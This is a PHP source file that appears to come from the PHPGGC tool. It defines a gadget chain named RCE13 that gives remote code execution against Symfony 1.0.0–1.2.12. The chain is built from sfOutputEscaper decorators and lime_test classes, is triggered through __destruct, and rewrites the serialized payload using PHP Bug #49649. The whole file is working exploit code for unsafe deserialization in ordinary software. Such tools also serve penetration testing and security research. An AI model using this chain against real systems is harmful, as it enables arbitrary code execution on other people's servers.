<?php

namespace GadgetChain\Symfony;

class RCE13 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.0.0 < 1.2.12';
    public static $vector = '__destruct';
    public static $author = 'darkpills';


    public function process_serialized($serialized)
    {
        $serialized2 = $serialized;
        
        // Leveraging PHP Bug #49649
        // insert the same $output attribute of lime_test class, but with public visibility 
        // for breaking change between 1.2.8 and 1.2.9 in lime_test attributes
        $find = '#s:9:".\\*.output";(.*}}})s:10:".\\*.results";#';
        $replace = 's:9:"'.chr(0).'*'.chr(0).'output";${1}s:6:"output";${1}s:10:"'.chr(0).'*'.chr(0).'results";';
        $serialized2 = preg_replace($find, $replace, $serialized2);

        // update the number of properties
        $find = '#"lime_test":8#';
        $replace = '"lime_test":9';
        $serialized2 = preg_replace($find, $replace, $serialized2);
        
        return $serialized2;
    }

    public function generate(array $parameters)
    {
        $value = array($parameters['parameter']);
        $escaper1 = new \sfOutputEscaperArrayDecorator($parameters['function'], $value);

        $lime_colorizer = new \lime_colorizer();
        $escaper2 = new \sfOutputEscaperObjectDecorator(array($escaper1, "current"), $lime_colorizer);
        
        $lime_output = new \lime_output_color($escaper2);
        $lime_test = new \lime_test($lime_output);

        return $lime_test;
    }
}
